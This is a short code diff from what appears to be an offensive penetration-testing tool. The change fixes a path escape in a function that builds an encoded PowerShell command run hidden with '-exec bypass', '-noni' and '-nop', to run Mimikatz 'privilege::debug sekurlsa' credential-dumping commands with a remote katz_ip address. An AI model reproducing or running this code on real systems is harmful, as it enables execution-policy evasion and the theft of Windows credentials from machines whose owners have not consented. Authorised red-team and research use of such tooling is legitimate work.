@@ -2659,7 +2659,7 @@ def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurl
         """.format(addr=katz_ip, katz_command=katz_command)
 
     if args.force_ps32:
-        command = 'IEX "$Env:windir\\SysWOW64\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}"'.format(b64encode(command.encode('UTF-16LE')))
+        command = 'IEX "$Env:windir\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}"'.format(b64encode(command.encode('UTF-16LE')))
 
     base64_command = b64encode(command.encode('UTF-16LE'))
 
